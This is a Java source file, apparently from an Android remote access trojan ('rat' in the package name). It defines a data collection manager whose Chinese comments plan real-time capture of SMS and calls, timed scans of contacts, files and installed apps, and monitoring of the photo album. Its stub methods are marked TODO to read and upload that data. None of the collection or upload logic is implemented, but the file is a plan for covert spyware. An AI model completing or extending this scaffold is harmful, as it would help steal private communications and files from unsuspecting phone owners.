package com.vendor.rat.data.collector;

import android.content.Context;
import android.util.Log;

/**
 * 数据收集管理器 (模块 05 核心)
 *
 * 统一调度所有数据收集任务:
 *   - 实时收集 (SmsReceiver / CallReceiver)
 *   - 定时扫描 (联系人 30m / 文件 60m / 应用 6h)
 *   - 被动监听 (相册 ContentObserver)
 */
public class DataCollectionManager {

    private static final String TAG = "DataCollectionMgr";
    private static volatile DataCollectionManager instance;

    private Context context;
    private boolean initialized = false;

    private DataCollectionManager() {}

    public static DataCollectionManager getInstance() {
        if (instance == null) {
            synchronized (DataCollectionManager.class) {
                if (instance == null) {
                    instance = new DataCollectionManager();
                }
            }
        }
        return instance;
    }

    public void init(Context context) {
        this.context = context.getApplicationContext();
        this.initialized = true;
        Log.i(TAG, "DataCollectionManager initialized");
    }

    /**
     * 启动所有数据收集
     */
    public void startAll() {
        if (!initialized) return;
        Log.d(TAG, "Starting all data collection tasks");
        // TODO: 启动各个收集器
    }

    /**
     * 同步联系人
     */
    public void syncContacts() {
        if (!initialized) return;
        // TODO: 读取并上传联系人
    }

    /**
     * 扫描文件
     */
    public void scanFiles() {
        if (!initialized) return;
        // TODO: 扫描并上传文件列表
    }

    /**
     * 收集应用列表
     */
    public void collectAppList() {
        if (!initialized) return;
        // TODO: 读取并上传已安装应用
    }

    /**
     * 收集设备信息
     */
    public void collectDeviceInfo() {
        if (!initialized) return;
        // TODO: 收集并上传设备信息
    }
}
